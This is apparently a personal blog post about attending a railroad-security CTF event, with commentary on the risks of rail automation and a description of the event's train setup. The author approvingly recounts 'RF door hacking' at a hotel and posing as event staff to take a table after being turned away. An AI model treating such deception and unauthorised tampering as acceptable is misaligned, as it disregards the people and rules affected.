+<p><code>Notes from far after the event</code> I still hold the idea that releasing the methods behind systems can be a major issue. But I think the goal of public review of systems can net a lot of benfit barring that the systems in place are able to be issued updates. If updates are impossible then well dang we are kinda stuck and the less people can test the system the better we are with skeletons in the closet.</p>
+<h2 id="private-and-public-sector-forced-co-operation"><a class="header" href="#private-and-public-sector-forced-co-operation">Private and public sector forced co-operation</a></h2>
+<p>While I do not accept any private company telling me they are working with my best interest in mind. I do however understand that given enough fee's and jail time a company might act in my interest only due to state applied pressure. The private sector will abuse a system as much as they can. Sorry if this sounds like a rant but it does apply. In our research you will begin to find a lot of workers in the rail industry talking about automation and the lay-offs happening even now. At the Hack The Railroad 2023 event the leaders of these companies even talk joyfully about a full automation solution. However as a security-mancer and or wizard I see this as a perfect system for abuse. No human interaction for complex systems is a very fast and dangerous route to embark on. Once an exploit is found and used the time it would take to correct a fault like that would be fatal to an automated system that rely on perfect timing. Imagine stopping a train in the middle of some far off woods far from human enabled midigation. I pale at the thought of someone first finding the issue, sending a team to investigate, beginning the process of trying to clear the fault or whatever, getting the system back into a working state. Global shipping is a great model for this behavoir. Once the Evergreen ship was stuck</p>
+<p>Oh uh, yeah anyhow long story short, a lack of humans is a very bad time when you have a system that could be attacked and left unattended. Even tho most industrial processes can and have been automated we still have humans very near to prevent some kind of critical failure.</p>
+<h1 id="when-wizards-meet"><a class="header" href="#when-wizards-meet">When wizards meet</a></h1>
+<p>As we made our way to the event. I connected with some friends who also planned on attending. Hard cut to us breaking out a HackRF and other SDR solutions we went to all learning how Radio Frequency works and the technology behind a lot of that type of magic. We had two plans, Running a couple of trains with the wizards court and finding out how drunk the apprentence mages could get. (They had added four new mages to the team in my absence)</p>
+<p>So as the moon greeted our arcane shinanigans and formal tutoring of the apprentence mages on alcohol based potion crafting our chaos was palpable. Our night was a blur of RF door hacking and hotel staff frustrations and the dawn was soon approaching.</p>
+<h1 id="beasts-of-iron-and-fire"><a class="header" href="#beasts-of-iron-and-fire">Beasts of iron and fire</a></h1>
+<p>Making our way to DreamPort we did the usual sign in and grabbing badges. Making our way past all the non-technical speeches I quickly went to the practical area. Now side note this is a great example of social engineering. Tables had name plates on them. Now we had been told that the event had run out of room for any more groups showing up. So I decided I had driven too far and prepare too much to be told no. So I dropped my stuff and acted like I was a helper. Noticed that all the people helping had merch jackets. So off to the shop I went. Got a cheap jacket and now I fit right in. Locating my old wizard groups table I notice two tables right next to them so I just moved the name plate to a empty table and began moving my stuff and with little to no fuss I had now scored a table. A few of the other groups had begun setting up so I found the first event of the day a induction speech and had my group ditch so we could go set up. We then just held down the table and no one so much as batted an eye to a group of CTF people setting up early and doing some updates and checking of scripts before the CTF began. Often people in cyber secuirty are way too introverted to want to cause an issue and if you dont act like an ass or cause a disturbance you can often be ignored. <code>AUTHORS NOTE: I too am in the introverted group. However I do recognize that if I would find it to be a hassle I know someone else would feel the same. I exploit my own feelings and hope for like minding people around me.</code></p>
+<h2 id="the-stage-is-set"><a class="header" href="#the-stage-is-set">The stage is set</a></h2>
+<p>With our Table, our Team, and our confidence full we took an early look at some of the physical challenges. A couple of train networks set up with switches and some ESP32 sensors strewn around. Many of the tracks had very cool home brew solutions to trip and trigger. After asking when the event was over it a lot of MQTT and some python holding the entire thing together. Kind of expected as much but it was a really nice set up with logic gates and what not.</p>
 
                     </main>
 
